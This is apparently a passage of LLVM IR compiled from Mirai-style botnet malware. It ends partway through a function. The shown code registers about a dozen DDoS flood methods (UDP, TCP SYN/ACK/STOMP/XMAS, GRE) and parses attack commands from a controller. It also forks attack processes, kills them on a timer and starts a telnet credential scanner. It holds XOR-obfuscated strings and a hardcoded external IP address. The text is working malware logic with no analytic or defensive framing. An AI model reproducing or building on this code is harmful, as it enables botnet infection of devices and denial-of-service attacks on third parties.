; ModuleID = 'host/ir_O1/Extendo.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.fd_set.26 = type { [16 x i64] }
%struct.timeval.27 = type { i64, i64 }

@methods_len = local_unnamed_addr global i8 0, align 1
@methods = local_unnamed_addr global %struct.attack_method** null, align 8
@attack_ongoing = local_unnamed_addr global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common local_unnamed_addr global i32 0, align 4
@scanner_pid = common local_unnamed_addr global i32 0, align 4
@fake_time = local_unnamed_addr global i32 0, align 4
@conn_table = common local_unnamed_addr global %struct.scanner_connection* null, align 8
@rsck = common local_unnamed_addr global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"5:?;\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"<!: acam\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c" 18:1 \00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"efg`a\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.13 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.14 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"191.96.112.109\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = local_unnamed_addr global i16 0, align 2
@auth_table_len = local_unnamed_addr global i32 0, align 4
@auth_table = local_unnamed_addr global %struct.scanner_auth* null, align 8
@table = common local_unnamed_addr global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -555811921, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpgeneric)
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpvse)
  tail call fastcc void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpdns)
  tail call fastcc void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_udpplain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpsyn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpack)
  tail call fastcc void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpstomp)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_tcpxmas)
  tail call fastcc void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greip)
  tail call fastcc void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_greeth)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #10
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #10
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #10
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 0), align 16
  %6 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %10, label %8

; <label>:8:                                      ; preds = %5
  %9 = tail call i32 @kill(i32 %6, i32 9) #10
  br label %10

; <label>:10:                                     ; preds = %8, %5
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %11 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %15, label %13

; <label>:13:                                     ; preds = %10
  %14 = tail call i32 @kill(i32 %11, i32 9) #10
  br label %15

; <label>:15:                                     ; preds = %13, %10
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 2), align 8
  %16 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %20, label %18

; <label>:18:                                     ; preds = %15
  %19 = tail call i32 @kill(i32 %16, i32 9) #10
  br label %20

; <label>:20:                                     ; preds = %18, %15
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 3), align 4
  %21 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %25, label %23

; <label>:23:                                     ; preds = %20
  %24 = tail call i32 @kill(i32 %21, i32 9) #10
  br label %25

; <label>:25:                                     ; preds = %23, %20
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 4), align 16
  %26 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %30, label %28

; <label>:28:                                     ; preds = %25
  %29 = tail call i32 @kill(i32 %26, i32 9) #10
  br label %30

; <label>:30:                                     ; preds = %28, %25
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 5), align 4
  %31 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #10
  br label %35

; <label>:35:                                     ; preds = %33, %30
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 6), align 8
  %36 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = tail call i32 @kill(i32 %36, i32 9) #10
  br label %40

; <label>:40:                                     ; preds = %38, %35
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 7), align 4
  %41 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %45, label %43

; <label>:43:                                     ; preds = %40
  %44 = tail call i32 @kill(i32 %41, i32 9) #10
  br label %45

; <label>:45:                                     ; preds = %43, %40
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 8), align 16
  %46 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %47 = icmp eq i32 %46, 0
  br i1 %47, label %50, label %48

; <label>:48:                                     ; preds = %45
  %49 = tail call i32 @kill(i32 %46, i32 9) #10
  br label %50

; <label>:50:                                     ; preds = %48, %45
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 9), align 4
  %51 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %55, label %53

; <label>:53:                                     ; preds = %50
  %54 = tail call i32 @kill(i32 %51, i32 9) #10
  br label %55

; <label>:55:                                     ; preds = %53, %50
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 10), align 8
  %56 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %60, label %58

; <label>:58:                                     ; preds = %55
  %59 = tail call i32 @kill(i32 %56, i32 9) #10
  br label %60

; <label>:60:                                     ; preds = %58, %55
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 11), align 4
  %61 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %63

; <label>:63:                                     ; preds = %60
  %64 = tail call i32 @kill(i32 %61, i32 9) #10
  br label %65

; <label>:65:                                     ; preds = %63, %60
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 12), align 16
  %66 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %70, label %68

; <label>:68:                                     ; preds = %65
  %69 = tail call i32 @kill(i32 %66, i32 9) #10
  br label %70

; <label>:70:                                     ; preds = %68, %65
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 13), align 4
  %71 = load i32, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %75, label %73

; <label>:73:                                     ; preds = %70
  %74 = tail call i32 @kill(i32 %71, i32 9) #10
  br label %75

; <label>:75:                                     ; preds = %73, %70
  store i32 0, i32* getelementptr inbounds ([15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 14), align 8
  tail call void @scanner_init() #10
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #11
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp eq i8 %16, 0
  br i1 %18, label %.thread80, label %19

; <label>:19:                                     ; preds = %13
  %20 = add i32 %1, -6
  %21 = sext i32 %20 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %19
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #10
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %17, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = load i32, i32* %34, align 4
  %41 = getelementptr inbounds i8, i8* %25, i64 4
  %42 = bitcast i8* %41 to i32*
  store i32 %40, i32* %42, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %43 = icmp eq i8 %16, 1
  br i1 %43, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %58, %.lr.ph88 ]
  %44 = bitcast i8* %.087 to i32*
  %45 = load i32, i32* %44, align 4
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %45, i32* %46, align 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 4
  %48 = getelementptr inbounds i8, i8* %.087, i64 5
  %49 = load i8, i8* %47, align 1
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %49, i8* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load i32, i32* %46, align 4
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %52, i32* %53, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %54 = bitcast i8* %48 to i32*
  %55 = load i32, i32* %54, align 4
  %56 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %55, i32* %56, align 4
  %57 = getelementptr inbounds i8, i8* %.087, i64 9
  %58 = getelementptr inbounds i8, i8* %.087, i64 10
  %59 = load i8, i8* %57, align 1
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %59, i8* %60, align 4
  %61 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %61, align 4
  %62 = load i32, i32* %56, align 4
  %63 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %62, i32* %63, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %64 = add i32 %1, -6
  %65 = mul nsw i32 %17, -5
  %66 = add i32 %64, %65
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %.loopexit81.thread, label %68

; <label>:68:                                     ; preds = %._crit_edge
  %69 = load i8, i8* %scevgep, align 1
  %70 = icmp eq i8 %69, 0
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %68
  %71 = zext i8 %69 to i64
  %72 = tail call noalias i8* @calloc(i64 %71, i64 16) #10
  %73 = bitcast i8* %72 to %struct.attack_option*
  %74 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %75 = add i32 %66, -1
  %76 = zext i8 %69 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %89
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %89 ]
  %.184 = phi i8* [ %74, %.lr.ph.preheader ], [ %95, %89 ]
  %.17583 = phi i32 [ %75, %.lr.ph.preheader ], [ %96, %89 ]
  %77 = icmp eq i32 %.17583, 0
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %.lr.ph
  %79 = load i8, i8* %.184, align 1
  %80 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 1
  store i8 %79, i8* %80, align 8
  %81 = icmp eq i32 %.17583, 1
  br i1 %81, label %.loopexit81.loopexit, label %82

; <label>:82:                                     ; preds = %78
  %83 = getelementptr inbounds i8, i8* %.184, i64 1
  %84 = getelementptr inbounds i8, i8* %.184, i64 2
  %85 = load i8, i8* %83, align 1
  %86 = add i32 %.17583, -2
  %87 = zext i8 %85 to i32
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %.loopexit81.loopexit, label %89

; <label>:89:                                     ; preds = %82
  %90 = add nuw nsw i32 %87, 1
  %91 = zext i32 %90 to i64
  %92 = tail call noalias i8* @calloc(i64 %91, i64 1) #10
  %93 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 0
  store i8* %92, i8** %93, align 8
  tail call void @util_memcpy(i8* %92, i8* %84, i32 %87) #10
  %94 = zext i8 %85 to i64
  %95 = getelementptr inbounds i8, i8* %84, i64 %94
  %96 = sub nsw i32 %86, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %97 = icmp slt i64 %indvars.iv.next, %76
  br i1 %97, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %89
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %68
  %.070 = phi %struct.attack_option* [ null, %68 ], [ %73, %.loopexit.loopexit ]
  %98 = tail call i32* @__errno_location() #11
  store i32 0, i32* %98, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %69, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %78, %82
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %73, %.loopexit81.loopexit ]
  %99 = icmp eq i8* %25, null
  br i1 %99, label %100, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %69, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #10
  br label %100

; <label>:100:                                    ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %69, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %101 = icmp eq %struct.attack_option* %.17196, null
  br i1 %101, label %.thread80, label %102

; <label>:102:                                    ; preds = %100
  %103 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %103)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %19, %100, %102
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

declare void @util_memcpy(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #10
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #10
  switch i32 %12, label %.preheader [
    i32 -1, label %18
    i32 0, label %19
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i64
  br label %25

; <label>:18:                                     ; preds = %11
  tail call void @exit(i32 0) #12
  unreachable

; <label>:19:                                     ; preds = %11
  %20 = tail call i32 @sleep(i32 %0) #10
  %21 = tail call i32 @getppid() #10
  %22 = tail call i32 @kill(i32 %21, i32 9) #10
  tail call void @exit(i32 0) #12
  unreachable

; <label>:23:                                     ; preds = %25
  %24 = icmp slt i64 %indvars.iv.next, %17
  br i1 %24, label %25, label %.loopexit.loopexit

; <label>:25:                                     ; preds = %.lr.ph, %23
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %23 ]
  %26 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %27 = load %struct.attack_method*, %struct.attack_method** %26, align 8
  %28 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %27, i64 0, i32 1
  %29 = load i8, i8* %28, align 8
  %30 = icmp eq i8 %29, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %30, label %31, label %23

; <label>:31:                                     ; preds = %25
  %32 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %27, i64 0, i32 0
  %33 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %32, align 8
  tail call void %33(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %23
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %31
  tail call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #10
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #10
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

